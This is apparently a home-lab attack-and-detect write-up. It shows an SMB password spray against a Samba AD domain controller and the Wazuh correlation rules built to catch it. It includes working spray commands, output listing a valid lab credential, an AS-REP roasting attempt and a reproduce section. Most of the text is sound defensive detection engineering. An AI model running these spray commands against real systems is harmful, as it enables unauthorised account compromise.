# Attack / Detect: SMB password spraying → a real credential, and the rule that catches it

**Phase 5 — Offense in context.** A paired attacker-console / defender-alert walkthrough of a **password
spray** executed from `atk-01` (Kali, REDTEAM) against the Samba AD DC, and the detection built to catch it.
Unlike the Kerberoast/DCSync chain (where impacket hits Samba interop walls), this attack **completes
end-to-end and returns a real, valid credential** — and closing the detection gap it exposed required both
new telemetry and a new correlation rule.

Domain: `lab.internal` · DC: `dc-01` (Samba AD DC 4.23.6) · Attacker: `atk-01` (`10.10.40.119`) ·
SIEM: `siem-01` (Wazuh manager).

> [!check] Built and verified live on 2026-09-02.
> Spray returned `svc-sql:Summer2026`; rule **100401** fired at level 12 (T1110.003) while the existing
> per-account brute rule **100041** stayed silent — exactly the gap this exercise set out to close.

---

## 1. Attack — executed from atk-01

A password spray inverts a brute force: instead of many passwords against **one** account (noisy, lockout-
prone), it tries **one** likely password against **many** accounts. Here, the obvious current-season guess:

```
$ nxc smb 10.10.10.10 -u ./spray-users.txt -p 'Summer2026' --continue-on-success
SMB  10.10.10.10  445  DC-01  [-] lab.internal\Administrator:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [-] lab.internal\asmith:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [-] lab.internal\jdoe:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [-] lab.internal\bwilson:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [-] lab.internal\svc-web:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [+] lab.internal\svc-sql:Summer2026            <-- valid credential
SMB  10.10.10.10  445  DC-01  [-] lab.internal\svc-backup:Summer2026 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  DC-01  [-] lab.internal\svc-legacy:Summer2026 STATUS_LOGON_FAILURE
```

**Real result:** one hit — `svc-sql` uses `Summer2026`, a season+year password directly in every cracking
wordlist. This works fully against Samba because SMB session-setup (NTLM) is a supported path; no Kerberos
authenticator is involved, so none of the `KRB_AP_ERR_INAPP_CKSUM` interop failures that block Kerberoast
apply here (see [01-fs01-credential-theft-to-dcsync](01-fs01-credential-theft-to-dcsync.md) §4).

**Why realistic, not contrived:** spraying the current season+year is one of the first things a real
operator tries, precisely because service accounts (set once, never rotated) so often use exactly this
pattern. `svc-sql`'s password mirrors that real-world weakness (see
[../../phase-2-identity/known-weaknesses.md](../../phase-2-identity/known-weaknesses.md)).

---

## 2. The detection gap this exposed

The lab already had `100040`/`100041` — a **Kerberos** pre-auth brute-force rule that correlates on
`same_field: Authentication.clientAccount` and fires when **one account** fails 4+ times in 60 s. Run the
spray against it and **it never fires**, for two independent reasons:

1. **Wrong shape.** A spray fails each account *once*. No single account crosses the per-account threshold,
   so a rule keyed on the account is structurally blind to it. This is the classic reason sprays are used.
2. **Wrong log.** On a Samba AD DC the SMB service (`smbd`) is a separate process that logs its auth to
   **`/var/log/samba/log.smbd`**, while the AD DC process (Kerberos/LDAP/DRSUAPI) logs to
   **`log.samba`** — the *only* file Wazuh was reading. The seven failed SMB logons landed in `log.smbd`
   (confirmed: 7 in `log.smbd`, 0 in `log.samba`), so Wazuh never even saw the events.

Both had to be fixed.

---

## 3. Detect — hunted in Wazuh

| Attacker action | Wazuh rule | Level | ATT&CK | Fires? |
|---|---|---|---|---|
| Each failed SMB logon | **100400** | 5 | T1110.001 | ✅ (6–7× per spray) |
| The spray as a whole (5+ SMB failures / 120 s) | **100401** | 12 | T1110 / **T1110.003** | ✅ |
| (control) per-account Kerberos brute rule | 100041 | 12 | T1110.001 | ❌ **by design** |

### 3a. Telemetry — add `log.smbd` as a Wazuh source

Samba emits a structured JSON audit line per failed SMB logon, identical in shape to the Kerberos events
the other rules use — a Windows-equivalent **eventId 4625**, with `serviceDescription: "SMB2"`:

```json
{"type":"Authentication","Authentication":{"eventId":4625,"status":"NT_STATUS_WRONG_PASSWORD",
 "serviceDescription":"SMB2","authDescription":"NTLMSSP","clientAccount":"svc-legacy",
 "remoteAddress":"ipv4:10.10.40.119:44274","localAddress":"ipv4:10.10.10.10:445"}}
```

Added `/var/log/samba/log.smbd` as a second `json` localfile on dc-01's agent — as a separate
`<ossec_config>` block via the dc role (`roles/dc/tasks/main.yml`), so the existing `log.samba` localfile is
untouched. Wazuh tails from the end, so the ~400 historical failures already in the file aren't replayed.

### 3b. Rules — base + burst correlation (`siem` role `local_rules.xml`)

- **100400** (level 5): `decoded_as json` + `type=Authentication` + `eventId=4625` +
  `serviceDescription=SMB2` → one alert per failed SMB logon. Mirrors the Kerberos base rule 100040.
- **100401** (level 12): `if_matched_sid 100400`, `frequency=4 timeframe=120` — and **deliberately no
  `same_field`**. That omission *is* the detection: it counts failed SMB logons across the whole domain,
  which is the horizontal spray signature that a per-account rule can't express.

**Defender view:**
> **L12 — Password spray suspected — 5+ failed SMB logons across the domain in 120s (single-source
> credential attack; 100041's per-account brute rule would miss this horizontal pattern).** (T1110.003)

### 3c. Verified end-to-end

`wazuh-logtest` confirms 100400 on a real captured event (`level 5`, description interpolates
`svc-legacy` / `ipv4:10.10.40.119`). Two live spray runs each produced a fresh **100401 level 12** alert
(`data.timestamp` 21:06:19Z and 21:10:38Z), and **100041 fired 0 times** across both — the gap is closed
and the control confirms the two rules see genuinely different attack shapes.

**Honest limitation:** source-IP attribution would be cleaner (a spray is "one host sweeping accounts"),
but `Authentication.remoteAddress` carries a per-connection source **port**, so it can't group, and pulling
a bare `srcip` needs a child decoder that strips the parent JSON fields — the same documented dead-end noted
on the Kerberoast rule. Frequency-of-SMB-failures is the robust signal in a single-DC lab; production would
baseline normal failure volume and add the srcip extraction. Documented, not hidden.

---

## 4. Related finding — AS-REP roasting does **not** work on this Samba DC

While extending the AD attack surface, I planted an AS-REP-roastable account (`svc-legacy`, a legacy
"pre-auth disabled" service account — a real misconfiguration pattern) by setting
`userAccountControl = 4194816` (NORMAL_ACCOUNT | `DONT_REQUIRE_PREAUTH`). The flag was verified persisted
in the directory and the KDC was hard-restarted twice (port 88 confirmed dropping), but:

```
$ impacket-GetNPUsers 'lab.internal/svc-legacy' -no-pass -dc-ip 10.10.10.10 -format hashcat
[-] User svc-legacy doesn't have UF_DONT_REQUIRE_PREAUTH set
```

impacket prints that when the KDC returns **`KDC_ERR_PREAUTH_REQUIRED`** — which is the *server's* decision,
not a client parse bug. **Samba's KDC does not honor `UF_DONT_REQUIRE_PREAUTH`**, so the AS-REP roast can't
complete, and — worse for a detection lab — it produces no distinctive telemetry to even alert on (the KDC
just runs the normal pre-auth-required handshake, which it doesn't audit). This is a genuine Samba-vs-Windows
boundary, the same family as the Kerberoast/DCSync interop walls. `svc-legacy` is kept as evidence of the
misconfig; on a real Windows DC it would be roastable. This is why the lab pivoted to password spraying —
an attack that *does* complete on Samba and returns a real credential.

---

## Reproduce

```bash
# Attack (from atk-01):
printf 'Administrator\nasmith\njdoe\nbwilson\nsvc-web\nsvc-sql\nsvc-backup\nsvc-legacy\n' > spray-users.txt
nxc smb 10.10.10.10 -u ./spray-users.txt -p 'Summer2026' --continue-on-success

# Detect (from siem-01), expect a 100401 level-12 alert and zero 100041:
sudo grep -a '"id":"100401"' /var/ossec/logs/alerts/alerts.json | tail -1
```

- Telemetry: `roles/dc/tasks/main.yml` adds `/var/log/samba/log.smbd` as a `json` localfile on dc-01.
- Rules: `roles/siem/files/local_rules.xml` — 100400 (base) + 100401 (spray correlation).
- Coverage: `phase-4-detection/attack-coverage/` now maps **T1110.003**.
